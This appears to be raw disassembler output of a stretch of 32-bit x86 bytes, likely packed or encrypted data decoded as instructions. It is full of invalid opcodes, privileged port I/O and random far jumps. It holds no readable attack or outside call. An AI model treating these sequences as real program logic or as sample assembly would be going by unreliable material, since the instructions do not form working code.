  409caf:	jp     0x409ceb
  409cb1:	pop    ss
  409cb2:	or     eax,0xffffffac
  409cb5:	cmp    DWORD PTR [esi-0x57727e41],esi
  409cbb:	dec    eax
  409cbc:	(bad)  
  409cbd:	stos   BYTE PTR es:[edi],al
  409cbe:	cmp    al,BYTE PTR [ebx+0x6b]
  409cc1:	out    dx,al
  409cc2:	pop    eax
  409cc3:	sbb    esp,DWORD PTR ds:0x72c7373d
  409cc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cca:	sbb    al,0x1c
  409ccc:	push   cs
  409ccd:	lahf   
  409cce:	add    DWORD PTR [ebx+0x3ce7f542],eax
  409cd4:	add    esp,ecx
  409cd6:	retf   
  409cd7:	sahf   
  409cd8:	mov    al,ds:0x6868fd1a
  409cdd:	(bad)  
  409cde:	sahf   
  409cdf:	leave  
  409ce0:	dec    ebx
  409ce1:	ret    0x89f8
  409ce4:	adc    DWORD PTR [eax-0x10],ebx
  409ce7:	das    
  409ce8:	pushf  
  409ce9:	sbb    al,0xfd
  409ceb:	sub    al,ah
  409ced:	jle    0x409d30
  409cef:	rcr    BYTE PTR [ecx-0x56],cl
  409cf2:	add    cl,al
  409cf4:	jge    0x409cd6
  409cf6:	jbe    0x409cb0
  409cf8:	push   ecx
  409cf9:	in     eax,0xb7
  409cfb:	(bad)
  409cfe:	icebp  
  409cff:	stos   BYTE PTR es:[edi],al
  409d00:	push   cs
  409d01:	jmp    0x644f:0x2b54c9
  409d08:	or     al,0x8
  409d0a:	pusha  
  409d0b:	mov    eax,0x9185206b
  409d10:	add    dl,BYTE PTR [esi+0x529b9574]
  409d16:	xchg   ebx,eax
  409d17:	jp     0x409d03
  409d19:	and    al,0x73
  409d1b:	pop    ecx
  409d1c:	sbb    DWORD PTR [edi],edx
  409d1e:	cmp    BYTE PTR [eax],dh
  409d20:	test   DWORD PTR [ecx+0x780cc8ad],edi
  409d26:	cli    
  409d27:	push   ebx
  409d28:	jmp    0xfcae:0x98e0b97b
  409d2f:	fdivr  QWORD PTR [edi+0x17]
  409d32:	or     ecx,DWORD PTR [ebp-0x3661dedd]
  409d38:	lahf   
  409d39:	jae    0x409d88
  409d3b:	lahf   
  409d3c:	imul   esi,esi,0x26
  409d3f:	add    al,0x30
  409d41:	outs   dx,DWORD PTR ds:[esi]
  409d42:	std    
  409d43:	or     BYTE PTR [ebp-0x73],0x2d
  409d47:	fsubr  DWORD PTR [ecx+ebp*8-0x52]
  409d4b:	mov    edi,0x7f4e8ab
  409d50:	ror    DWORD PTR [eax+0x6a7d971b],1
  409d56:	imul   BYTE PTR ds:0xc8567c21
  409d5c:	lods   al,BYTE PTR ds:[esi]
  409d5d:	jmp    DWORD PTR [edx]
  409d5f:	cwde   
  409d60:	mov    al,BYTE PTR [esi]
  409d62:	pop    edx
  409d63:	xchg   ecx,eax
  409d64:	push   0xfa837442
  409d69:	fisttp WORD PTR [esi+0xd8af760]
  409d6f:	mov    ebp,0xb531e1eb
  409d74:	sub    eax,0xdf6c70d1
  409d79:	fistp  QWORD PTR [ebp-0x4051673b]
  409d7f:	retf   0xcdae
  409d82:	cld    
  409d83:	outs   dx,BYTE PTR ds:[esi]
  409d84:	mov    eax,0x9e5ab249
  409d89:	xor    ah,BYTE PTR [ebx]
  409d8b:	enter  0x1a04,0x4f
  409d8f:	fadd   st,st(7)
  409d91:	and    esp,DWORD PTR [edi+0x4c]
  409d94:	jmp    0x409e0c
  409d96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d97:	mov    ebp,0xb3bb7144
  409d9c:	shl    al,cl
  409d9e:	cmp    BYTE PTR [ebp-0x49],dh
  409da1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409da2:	in     eax,0x97
  409da4:	adc    DWORD PTR [edx-0xe5fdc19],eax
  409daa:	cld    
  409dab:	lea    esp,[eax]
  409dad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409dae:	mov    esp,0xfa103c89
  409db3:	(bad)  
  409db4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409db5:	mov    edx,0xbf493992
  409dba:	pushf  
  409dbb:	xchg   BYTE PTR [ebx-0x47fe031c],dl
  409dc1:	nop
  409dc2:	push   DWORD PTR [esi-0x3813a5dd]
  409dc8:	ja     0x409e28
  409dca:	pop    ds
  409dcb:	jp     0x409df7
  409dcd:	mov    ah,0xb3
  409dcf:	daa    
  409dd0:	jmp    0x409e25
  409dd2:	mov    ebp,0x9b33b81f
  409dd7:	mov    al,0x18
  409dd9:	fild   QWORD PTR ds:0xb9f549e8
  409ddf:	xchg   edx,eax
  409de0:	pop    ebx
  409de1:	mov    edi,0x9dacdffc
  409de6:	retf   0x349
  409de9:	jb     0x409e1e
  409deb:	mov    esi,0xa1b77098
  409df0:	jmp    0x409de0
  409df2:	jg     0x409de3
  409df4:	add    eax,0x63b03a6d
  409df9:	into   
  409dfa:	cld    
  409dfb:	dec    eax
  409dfc:	cs enter 0x286c,0x3d
  409e01:	add    BYTE PTR [eax-0x599bd538],ch
  409e07:	imul   ebx,ecx,0x5c
  409e0a:	push   ebp
  409e0b:	es out dx,al
  409e0d:	cmp    eax,0xdfe837f6
  409e12:	xchg   esi,eax
  409e13:	(bad)  
  409e15:	cmovns ebx,DWORD PTR [eax+0x2b]
  409e19:	fbld   TBYTE PTR [edx-0x5b8af267]
  409e1f:	push   ebx
  409e20:	xchg   DWORD PTR [eax],edi
  409e22:	std    
  409e23:	dec    eax
  409e24:	call   0x5463c5a1
  409e29:	inc    BYTE PTR [esi+0x7431a7c8]
  409e2f:	cmp    dl,BYTE PTR [edi-0x38540053]
  409e35:	mov    edi,?
  409e37:	jns    0x409e1a
  409e39:	loopne 0x409e70
  409e3b:	adc    al,0xf4
  409e3d:	mov    ?,WORD PTR [ebp-0x395f1e74]
  409e43:	enter  0x1d80,0xdf
  409e47:	push   ebx
  409e48:	dec    ecx
  409e49:	aam    0x1f
  409e4b:	(bad)  
  409e4c:	jmp    0x409e1d
  409e4e:	push   ebp
  409e4f:	cld    
  409e50:	addr16 retf 0x3342
  409e54:	pop    edx
  409e55:	icebp  
  409e56:	sar    ebp,1
  409e58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e59:	(bad)  
  409e5b:	jno    0x409e0d
  409e5d:	imul   ebp,DWORD PTR [edx+0x93fecf7],0x38
  409e64:	cmp    DWORD PTR [edx+0x673ab995],ebp
  409e6a:	inc    eax
  409e6b:	mov    bh,0x84
  409e6d:	fild   WORD PTR [esi]
  409e6f:	inc    eax
  409e70:	push   ebx
  409e71:	(bad)  
  409e72:	scas   al,BYTE PTR es:[edi]
  409e73:	js     0x409e26
  409e75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e76:	(bad)  
  409e77:	jl     0x409e43
  409e79:	dec    eax
  409e7a:	jnp    0x409e48
  409e7c:	js     0x409e5d
  409e7e:	push   ds
  409e7f:	jne    0x409ea7
  409e81:	xor    DWORD PTR [esp+eiz*4],0xaefd0275
  409e88:	bound  ebx,QWORD PTR [ebp+0x39]
  409e8b:	fsub   st(1),st
  409e8d:	shl    BYTE PTR [edx+0x21da347c],cl
  409e93:	enter  0xcb82,0x7b
  409e97:	mov    cl,0x3c
  409e99:	repnz sub bh,dl
  409e9c:	jmp    0x409ec2
  409e9e:	push   ds
  409e9f:	sub    BYTE PTR [eax+esi*1-0x23188a96],0x48
  409ea7:	jmp    0x1e17:0xa9f70246
  409eae:	aam    0x1d
  409eb0:	cmp    DWORD PTR [edi+0x6ceb77ee],0x6b36977f
  409eba:	imul   edi,DWORD PTR [eax-0x31b71fcf],0x18459652
  409ec4:	loop   0x409e74
  409ec6:	inc    ecx
  409ec7:	mov    al,0xf2
  409ec9:	stc    
  409eca:	jbe    0x409f03
  409ecc:	enter  0x3df,0x1f
  409ed0:	loopne 0x409eb0
  409ed2:	push   ecx
  409ed3:	mov    edi,0xdc4f0724
  409ed8:	jmp    0x4eab1545
  409edd:	or     al,0x3d
  409edf:	jmp    0x409e76
  409ee1:	adc    ebp,edi
  409ee3:	jmp    0x55bf:0xe007b62e
  409eea:	add    al,cl
  409eec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409eed:	ss pushf 
  409eef:	retf   0x3f88
  409ef2:	sbb    DWORD PTR [ebx-0x15],ecx
  409ef5:	sbb    al,0xe8
  409ef7:	int3   
  409ef8:	add    eax,0x95c1a396
  409efd:	fwait
  409efe:	mov    bh,0xea
  409f00:	jmp    0x409ecf
  409f02:	aas    
  409f03:	xor    DWORD PTR [ecx],edx
  409f05:	test   BYTE PTR [ebx],ah
  409f07:	mov    ecx,0x2b9131eb
  409f0c:	mov    ds:0x1944b3a6,al
  409f11:	fbstp  TBYTE PTR [eax]
  409f13:	lahf   
  409f14:	lds    ebx,FWORD PTR [ebp+0x41]
  409f17:	hlt    
  409f18:	sbb    BYTE PTR [ecx],bh
  409f1a:	std    
  409f1b:	xchg   edi,eax
  409f1c:	test   DWORD PTR ds:0xe8a6f817,eax
  409f22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f23:	jecxz  0x409f68
  409f25:	and    eax,0x4d94607d
  409f2a:	aaa    
  409f2b:	xchg   esi,eax
  409f2c:	stos   DWORD PTR es:[edi],eax
  409f2d:	in     al,0x4
  409f2f:	push   ss
  409f30:	cmp    al,0xe0
  409f32:	fadd   DWORD PTR [edi+esi*4-0x18]
  409f36:	loop   0x409ec1
  409f38:	outs   dx,DWORD PTR ds:[esi]
  409f39:	pop    edi
  409f3a:	call   0x4d797503
  409f3f:	dec    ebx
  409f40:	jmp    0x409f26
  409f42:	mov    cl,0x57
  409f44:	pop    ebp
  409f45:	xor    eax,DWORD PTR [ebx+0x40]
  409f48:	out    0xde,al
  409f4a:	cmp    al,0xdf
  409f4c:	mov    bl,0x78
  409f4e:	sbb    al,0x3a
  409f50:	add    BYTE PTR [ecx+ebx*4+0x55],cl
  409f54:	jmp    0x409f29
  409f56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f57:	fs out dx,eax
  409f59:	popa   
  409f5a:	mov    WORD PTR [edi],gs
  409f5c:	inc    eax
  409f5d:	fild   WORD PTR [ebp-0x20d4816f]
  409f63:	enter  0xb239,0xfc
  409f67:	test   BYTE PTR [esi],bl
  409f69:	ins    DWORD PTR es:[edi],dx
  409f6a:	mov    cl,0xe6
  409f6c:	rcl    esi,cl
  409f6e:	sbb    DWORD PTR [edx-0x71db20f2],esp
  409f74:	xchg   edi,eax
  409f75:	(bad)  
  409f76:	mov    ebp,0xfd8c584a
  409f7b:	cli    
  409f7c:	es dec edx
  409f7e:	jecxz  0x409ff8
  409f80:	shr    edi,cl
  409f82:	sbb    ecx,esp
  409f84:	xor    dh,dl
  409f86:	jl     0x409fa3
  409f88:	sub    ah,BYTE PTR [esi-0x75db69f5]
  409f8e:	add    ah,BYTE PTR [esi+0x113c9cf2]
  409f94:	sti    
  409f95:	xchg   ebp,eax
  409f96:	scas   al,BYTE PTR es:[edi]
  409f97:	or     BYTE PTR [edi+ebx*8-0x32],bh
  409f9b:	int3   
  409f9c:	mov    dl,0xfd
  409f9e:	xlat   BYTE PTR ds:[ebx]
  409f9f:	call   esp
  409fa1:	add    ebp,edi
  409fa3:	call   0xd35d:0xb334c8c3
  409faa:	loopne 0x409f72
  409fac:	imul   ecx,DWORD PTR cs:[esp+edi*2+0x1],0xf126870
  409fb5:	or     BYTE PTR [edi],0xb5
  409fb8:	dec    esp
  409fb9:	push   ss
  409fba:	std    
  409fbb:	or     al,0x2f
  409fbd:	call   0xdca04b30
  409fc2:	and    ebp,eax
  409fc4:	cdq    
  409fc5:	adc    esp,eax
  409fc7:	push   cs
  409fc8:	cmp    al,0xaa
  409fca:	shl    esp,0x6c
  409fcd:	inc    edi
  409fce:	repz and ebp,esi
  409fd1:	(bad)  
  409fd2:	mov    cs,WORD PTR [ecx-0x53c10a1d]
  409fd8:	inc    ebx
  409fd9:	outs   dx,DWORD PTR ds:[esi]
  409fda:	call   0x832872a6
  409fdf:	or     DWORD PTR [ebx+eiz*8],ecx
  409fe2:	xchg   edi,eax
  409fe3:	sub    al,0xeb
  409fe5:	fdivr  QWORD PTR [eax-0x474a962]
  409feb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fec:	test   al,0xdf
  409fee:	jb     0x409fc3
  409ff0:	pop    esi
  409ff1:	sti    
  409ff2:	std    
  409ff3:	add    eax,0xd3fd152b
  409ff8:	cs (bad) 
  409ffa:	dec    edx
  409ffb:	mov    ebp,DWORD PTR [ecx+0x5ac83942]
  40a001:	sbb    ch,BYTE PTR [edx+0x18]
  40a004:	mov    bh,0x52
  40a006:	lahf   
  40a007:	ret    0x8eea
  40a00a:	nop
  40a00b:	mov    edx,0x61beb811
  40a010:	jmp    0x11de:0x3aaecd67
  40a017:	push   edi
  40a018:	inc    BYTE PTR [ecx+0x2398b249]
  40a01e:	sub    eax,0xd9a9eb0b
  40a023:	jmp    0x864c5d2c
  40a028:	fist   WORD PTR [di-0x7887]
  40a02d:	and    BYTE PTR [edi+ebx*2-0x65036647],0x68
  40a035:	sub    DWORD PTR [esi-0x20c25b71],edi
  40a03b:	enter  0xbae5,0xd8
  40a03f:	or     ah,BYTE PTR [edx-0x44]
  40a042:	adc    al,ch
  40a044:	dec    ecx
  40a045:	arpl   bp,sp
  40a047:	or     ecx,DWORD PTR [ebp+0xb]
  40a04a:	pushf  
  40a04b:	dec    eax
  40a04c:	rdmsr  
  40a04e:	pop    esi
  40a04f:	imul   eax,DWORD PTR [edi-0xd37a52b],0xffffffc9
  40a056:	cmp    eax,0xc47ba717
  40a05b:	stc    
  40a05c:	jmp    0x40a018
  40a05e:	mov    ebx,0x7879ab05
  40a063:	shl    BYTE PTR [edi],0xd8
  40a066:	aam    0x92
  40a068:	test   BYTE PTR [ebx+0x3d],al
  40a06b:	push   0xba135c56
  40a070:	xor    al,0xaf
  40a072:	ds dec ecx
  40a074:	ret    
  40a075:	and    esp,0xffffffdd
  40a078:	pop    es
  40a079:	xchg   esi,eax
  40a07a:	sbb    ecx,esi
  40a07c:	cmp    DWORD PTR [eax+0x78eaa275],ecx
  40a082:	mov    cl,0x2b
  40a084:	pop    ebx
  40a085:	inc    esp
  40a086:	mov    edi,0x2e42e6b9
  40a08b:	and    BYTE PTR [ecx+0x63],0x9d
  40a08f:	(bad)  
  40a090:	es sub al,0xf8
  40a093:	into   
  40a094:	push   ss
  40a095:	push   ebp
  40a096:	fcmove st,st(5)
  40a098:	int    0x6d
  40a09a:	popf   
  40a09b:	add    ah,BYTE PTR [eax-0x3d]
  40a09e:	jl     0x40a05e
  40a0a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0a1:	(bad)  
  40a0a2:	std    
  40a0a3:	jge    0x40a082
  40a0a5:	inc    esp
  40a0a6:	stos   BYTE PTR es:[edi],al
  40a0a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0a8:	cdq    
  40a0a9:	push   es
  40a0aa:	push   ecx
  40a0ab:	and    BYTE PTR [eax-0x36fa1816],dl
  40a0b1:	ffreep st(2)
  40a0b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0b4:	mov    ebx,0xe6e27d9d
  40a0b9:	hlt    
  40a0ba:	mov    esp,0xd363698b
  40a0bf:	(bad)  
  40a0c0:	jg     0x40a0ed
  40a0c2:	(bad)  
  40a0c3:	out    dx,eax
  40a0c4:	jmp    0x3adca6a8
  40a0c9:	xchg   BYTE PTR [edi-0x23],dh
  40a0cc:	test   BYTE PTR [esi-0x3],dl
  40a0cf:	mov    ds:0xcd29455a,al
  40a0d4:	addr16 loopne 0x40a08b
  40a0d7:	retf   
  40a0d8:	mov    ds,WORD PTR [ebp+0x62719853]
  40a0de:	pop    esi
  40a0df:	sub    BYTE PTR [esi+0x4f],0xec
  40a0e3:	dec    DWORD PTR [edi+ecx*8]
  40a0e6:	out    0xc0,eax
  40a0e8:	jmp    0x40a152
  40a0ea:	out    0xf4,eax
  40a0ec:	(bad)  
  40a0ed:	out    dx,al
  40a0ee:	pop    ds
  40a0ef:	ds fisttp WORD PTR cs:[ebx]
  40a0f3:	xchg   esp,eax
  40a0f4:	cdq    
  40a0f5:	lods   eax,DWORD PTR ds:[esi]
  40a0f6:	ror    ebx,1
  40a0f8:	inc    esi
  40a0f9:	and    cl,BYTE PTR [ebp-0x2ad841b]
  40a0ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a100:	mov    ds:0x2425c7bb,eax
  40a105:	jp     0x40a147
  40a107:	enter  0xac0c,0x11
  40a10b:	sahf   
  40a10c:	jne    0x40a18b
  40a10e:	retf   
  40a10f:	mov    dh,0xec
  40a111:	push   ds
  40a112:	inc    ebp
  40a113:	mov    eax,ds:0x3e0bfbb3
  40a118:	paddusb mm5,mm3
  40a11b:	(bad)  
  40a11c:	push   ss
  40a11d:	or     al,0xd7
  40a11f:	mov    si,0xeaca
  40a123:	gs call 0x89df:0x7ff430b8
  40a12b:	dec    ecx
  40a12c:	mov    ds:0x84f86628,al
  40a131:	fsubrp st(6),st
  40a133:	inc    ebx
  40a134:	lds    ebx,FWORD PTR [eax+0x538a4dfb]
  40a13a:	fdivrp st(5),st
  40a13c:	add    BYTE PTR [ecx],cl
  40a13e:	sbb    DWORD PTR [ebx+0x6a],ebp
  40a141:	dec    esi
  40a142:	mov    al,ds:0xf4002a9
  40a147:	ficomp DWORD PTR [edx-0x8500f21]
  40a14d:	xchg   edi,eax
  40a14e:	ss out 0xa8,al
  40a151:	test   eax,0x33c6cffc
  40a156:	and    al,0x5b
  40a158:	xor    DWORD PTR [eax-0x43],edi
  40a15b:	enter  0x6e9b,0x6a
  40a15f:	arpl   WORD PTR [eax-0x13ab4026],sp
  40a165:	loop   0x40a139
  40a167:	cdq    
  40a168:	jae    0x40a19e
  40a16a:	sbb    dl,bl
  40a16c:	sub    esp,DWORD PTR [ebp-0x50ef387e]
  40a172:	or     al,0xeb
  40a174:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a175:	lahf   
  40a176:	inc    eax
  40a177:	out    0x28,al
  40a179:	mov    bh,ch
  40a17b:	and    esi,DWORD PTR [esi]
  40a17d:	and    al,dh
  40a17f:	pusha  
  40a180:	ja     0x40a1e7
  40a182:	cwde   
  40a183:	enter  0xc8ea,0x2f
  40a187:	in     eax,dx
  40a188:	xchg   edi,eax
  40a189:	setb   dh
  40a18c:	jmp    0x40a187
  40a18e:	mov    dh,0x53
  40a190:	lods   eax,DWORD PTR ds:[esi]
  40a191:	jmp    0xd8c7b8e8
  40a196:	cmp    al,BYTE PTR [ebx]
  40a198:	mov    ebp,0x993bbcf3
  40a19d:	scas   eax,DWORD PTR es:[edi]
  40a19e:	mov    ah,al
  40a1a0:	jmp    0x40a14a
  40a1a2:	cmp    al,0xde
  40a1a4:	adc    DWORD PTR [ecx-0x207ece0d],0x1
  40a1ab:	sub    al,bl
  40a1ad:	ficomp DWORD PTR [edx+edi*2+0x1fcc7f5]
  40a1b4:	loopne 0x40a140
  40a1b6:	sub    al,0xe
  40a1b8:	xor    ebp,ebx
  40a1ba:	cmp    eax,ecx
  40a1bc:	test   DWORD PTR [ebp-0x18],ebx
  40a1bf:	aaa    
  40a1c0:	int3   
  40a1c1:	add    bh,dh
  40a1c3:	mov    ebp,0x96ee5eb
  40a1c8:	mov    bh,0x21
  40a1ca:	push   ecx
  40a1cb:	mov    edi,0xf8d7e919
  40a1d0:	sbb    ebx,DWORD PTR [edi+0x23]
  40a1d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1d4:	inc    edi
  40a1d5:	push   0xeb1b2fbf
  40a1da:	loopne 0x40a176
  40a1dc:	pop    edi
  40a1dd:	pop    edi
  40a1de:	mov    cl,0x6c
  40a1e0:	lock mov bh,0xc7
  40a1e3:	sub    BYTE PTR [edi+0x3e43d1af],bl
  40a1e9:	lock mov ebp,0x3cebedf8
  40a1ef:	push   cs
  40a1f0:	xlat   BYTE PTR ds:[ebx]
  40a1f1:	outs   dx,BYTE PTR ds:[esi]
  40a1f2:	popf   
  40a1f3:	jne    0x40a1b0
  40a1f5:	jecxz  0x40a23e
  40a1f7:	in     al,0xeb
  40a1f9:	inc    esi
  40a1fa:	cld    
  40a1fb:	outs   dx,DWORD PTR ds:[esi]
  40a1fc:	xchg   DWORD PTR [edi-0x3b42b38b],ecx
  40a202:	outs   dx,BYTE PTR ds:[esi]
  40a203:	enter  0xa7f4,0x58
  40a207:	mov    cl,0x7e
  40a209:	rol    DWORD PTR [esi+0x47],cl
  40a20c:	jmp    0x40a1ef
  40a20e:	aam    0xe2
  40a210:	mov    eax,ds:0xaa23e569
  40a215:	fcomip st,st(0)
  40a217:	lar    esi,WORD PTR [eax+0x57c292a6]
  40a21e:	std    
  40a21f:	and    esp,DWORD PTR ds:[ebx-0x308fa3e5]
  40a226:	xchg   edi,eax
  40a227:	enter  0x31c5,0x8
  40a22b:	dec    esp
  40a22c:	lss    esp,FWORD PTR [eax-0x27ee14bd]
  40a233:	xchg   ecx,eax
  40a234:	fild   QWORD PTR [eax-0x20f67b68]
  40a23a:	ins    BYTE PTR es:[edi],dx
  40a23b:	xchg   esi,eax
  40a23c:	mov    esi,DWORD PTR [esi-0x11b94d84]
  40a242:	stos   BYTE PTR es:[edi],al
  40a243:	stc    
  40a244:	neg    ch
  40a246:	and    ebx,esp
  40a248:	jmp    0x40a28b
  40a24a:	in     eax,dx
  40a24b:	or     ch,bl
  40a24d:	rol    ebx,1
  40a24f:	sbb    eax,0xc8acce1b
  40a254:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a255:	and    BYTE PTR [eax+0x6f353a78],bh
  40a25b:	or     eax,0x4a9b6495
  40a260:	jmp    0x40a21a
  40a262:	xchg   ebp,eax
  40a263:	(bad)  
  40a264:	cs mov ebx,0x4119c756
  40a26a:	fisubr WORD PTR [ebx]
  40a26c:	xchg   ecx,eax
  40a26d:	fbld   TBYTE PTR [ecx]
  40a26f:	mov    esp,DWORD PTR [ecx-0x27]
  40a272:	das    
  40a273:	push   esp
  40a274:	test   eax,0x8323fe81
  40a279:	push   ebx
  40a27a:	jmp    0x9115c996
  40a27f:	sub    dl,BYTE PTR [esi+0x3c26eb20]
  40a285:	sbb    al,0x76
  40a287:	push   esp
  40a288:	arpl   bp,di
  40a28a:	or     DWORD PTR [edi-0x365b8115],ecx
  40a290:	and    al,0xc6
  40a292:	out    0x7b,eax
  40a294:	dec    ebx
  40a295:	fucomip st,st(1)
  40a297:	lods   eax,DWORD PTR ds:[esi]
  40a298:	inc    esi
  40a299:	sbb    al,0x79
  40a29b:	jno    0x40a243
  40a29d:	retf   
  40a29e:	cld    
  40a29f:	sub    BYTE PTR [eax],ch
  40a2a1:	bound  esi,QWORD PTR [esi+0x2df0b91e]
  40a2a7:	enter  0xbd13,0xe9
  40a2ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2ac:	mov    dh,0x8d
  40a2ae:	test   DWORD PTR [esi],edx
  40a2b0:	jmp    0x20c7:0x5749f895
  40a2b7:	push   0xc7f3fbd3
  40a2bc:	jbe    0x40a2c8
  40a2be:	add    BYTE PTR [edi+0x26b4319c],cl
  40a2c4:	mov    ebx,0xe95acdd1
  40a2c9:	pop    esp
  40a2ca:	or     DWORD PTR [edx+ecx*1],edi
  40a2cd:	test   BYTE PTR [edx-0x42fe89b8],dl
  40a2d3:	mov    esi,0xb98cdecc
  40a2d8:	and    BYTE PTR [edx+ebx*1-0x4cb8397e],0xdb
  40a2e0:	loop   0x40a2c6
  40a2e2:	lahf   
  40a2e3:	dec    eax
  40a2e4:	fidivr WORD PTR [edx+esi*1+0x46]
  40a2e8:	mov    esi,0x20c87935
  40a2ed:	fisttp DWORD PTR [ecx]
  40a2ef:	aaa    
  40a2f0:	push   ebp
  40a2f1:	icebp  
  40a2f2:	xchg   ebx,eax
  40a2f3:	push   cs
  40a2f4:	add    eax,DWORD PTR [eax+ecx*1-0x568a6070]
  40a2fb:	enter  0xa7c8,0xde
  40a2ff:	jp     0x40a355
  40a301:	jge    0x40a2a2
  40a303:	pop    es
  40a304:	jmp    0x40a32f
  40a306:	push   ss
  40a307:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a308:	jnp    0x40a352
  40a30a:	(bad)  
  40a30b:	xor    al,0x7e
  40a30d:	fisttp WORD PTR [ebx]
  40a30f:	out    0xc3,eax
  40a311:	xor    DWORD PTR [edx],edx
  40a313:	jmp    0x73d4be5
  40a318:	push   es
  40a319:	or     edx,edx
  40a31b:	(bad)  
  40a31c:	sub    DWORD PTR [ecx+ebx*4+0x5e8103c8],edx
  40a323:	ins    DWORD PTR es:[edi],dx
  40a324:	push   esi
  40a325:	fsub   DWORD PTR [esi+0x63]
  40a328:	jmp    0x40a370
  40a32a:	cmp    al,0x42
  40a32c:	fnstenv [esi+0x537d4547]
  40a332:	pop    ds
  40a333:	enter  0x10b0,0x39
  40a337:	pop    esp
  40a338:	aaa    
  40a339:	and    edx,DWORD PTR [edx-0x19]
  40a33c:	mov    eax,ds:0x8a9e03a9
  40a341:	push   es
  40a342:	std    
  40a343:	in     al,0xb9
  40a345:	(bad)  
  40a346:	in     eax,dx
  40a347:	leave  
  40a348:	loop   0x40a329
  40a34a:	or     esi,ecx
  40a34c:	cmp    al,0x17
  40a34e:	fbld   TBYTE PTR [edi-0x50]
  40a351:	cmp    eax,0x759199fd
  40a356:	mov    bh,0xa9
  40a358:	add    eax,0xa3ba7023
  40a35d:	mov    ebp,0xbb14c7ec
  40a362:	or     al,0x13
  40a364:	and    al,0xb6
  40a366:	cld    
  40a367:	div    BYTE PTR [ecx+ebx*2]
  40a36a:	rcl    DWORD PTR [edi-0x37a93b7d],1
  40a370:	dec    eax
  40a371:	jo     0x40a3e3
  40a373:	cmp    DWORD PTR [ebx+ecx*8],ecx
  40a376:	(bad)  
  40a377:	(bad)  
  40a378:	jmp    0x40a35e
  40a37a:	es push es
  40a37c:	enter  0x4e1b,0xf6
  40a380:	loope  0x40a36a
  40a382:	jnp    0x40a39b
  40a384:	push   edx
  40a385:	pop    ds
  40a386:	add    eax,0x2fa7b82a
  40a38b:	lock jmp 0x40a3a3
  40a38e:	faddp  st(1),st
  40a390:	cdq    
  40a391:	pop    ds
  40a392:	adc    esi,0x71e6dcb1
  40a398:	adc    BYTE PTR [ebx-0x68ec3a20],0x3e
  40a39f:	(bad)  
  40a3a0:	jmp    0x40a367
  40a3a2:	xor    al,BYTE PTR [edx-0x6f05a7a4]
  40a3a8:	sti    
  40a3a9:	shl    BYTE PTR [ecx-0x78b11c38],1
  40a3af:	xor    eax,0x28f069c6
  40a3b4:	jmp    0x40a41c
  40a3b6:	cmc    
  40a3b7:	dec    eax
  40a3b8:	addr16 jl 0x40a380
  40a3bb:	xor    ebp,DWORD PTR [esi]
  40a3bd:	pop    es
  40a3be:	cmp    eax,DWORD PTR [ecx]
  40a3c0:	push   0xffffff91
  40a3c2:	add    BYTE PTR [esi+0x35],bl
  40a3c5:	ins    DWORD PTR es:[edi],dx
  40a3c6:	add    BYTE PTR [esi-0x7c],cl
  40a3c9:	(bad)  
  40a3ca:	rcl    DWORD PTR [edi-0x92d905c],cl
  40a3d0:	mov    esi,0x16457ddf
  40a3d5:	xor    al,0x88
  40a3d7:	push   edi
  40a3d8:	lahf   
  40a3d9:	sahf   
  40a3da:	cld    
  40a3db:	nop
  40a3dc:	out    dx,eax
  40a3dd:	push   cs
  40a3de:	sub    DWORD PTR [esi-0x56],eax
  40a3e1:	cs inc bh
  40a3e4:	push   es
  40a3e5:	outs   dx,BYTE PTR ds:[esi]
  40a3e6:	and    bh,bh
  40a3e8:	rol    ecx,cl
  40a3ea:	rol    BYTE PTR [ebp+0x3bbcbdeb],1
  40a3f0:	pop    ss
  40a3f1:	dec    esp
  40a3f2:	xor    eax,0xfed8450c
  40a3f7:	das    
  40a3f8:	pop    esp
  40a3f9:	hlt    
  40a3fa:	pop    esp
  40a3fb:	aam    0x66
  40a3fd:	pop    ebx
  40a3fe:	cmc    
  40a3ff:	mov    edx,0xcfba93eb
  40a404:	in     al,dx
  40a405:	xchg   edi,eax
  40a406:	mov    bh,0x1
  40a408:	pushf  
  40a409:	aam    0xcb
  40a40b:	(bad)  
  40a40c:	mov    al,0x24
  40a40e:	jge    0x40a464
  40a410:	mov    esi,0xea2953d4
  40a415:	add    ebp,DWORD PTR [esi-0x36f59a9d]
  40a41b:	inc    eax
  40a41c:	repz out dx,eax
  40a41e:	(bad)
  40a422:	xchg   DWORD PTR [ebx+0x6e],ecx
  40a425:	add    ch,0x85
  40a428:	jmp    0x40a441
  40a42a:	mov    dl,0xd8
  40a42c:	pop    ss
  40a42d:	shr    BYTE PTR [edx+0x5d],1
  40a430:	loopne 0x40a436
  40a432:	jmp    DWORD PTR ds:0xea0508eb
  40a438:	ss adc ebp,0x4e7debf9
  40a43f:	cmp    al,0x1a
  40a441:	push   edx
  40a442:	cdq    
  40a443:	dec    esi
  40a444:	mov    ch,0xea
  40a446:	outs   dx,DWORD PTR ds:[esi]
  40a447:	dec    ecx
  40a448:	retf   0x1c5f
  40a44b:	loopne 0x40a41b
  40a44d:	sbb    edi,DWORD PTR [ebx+0x7277e4f4]
  40a453:	dec    eax
  40a454:	mov    BYTE PTR [ebx+0x64097ff9],ch
  40a45a:	vpcmov xmm4,xmm3,XMMWORD PTR [ebp+0x119d940a],xmm0
  40a464:	out    0x54,al
  40a466:	jb     0x40a4a0
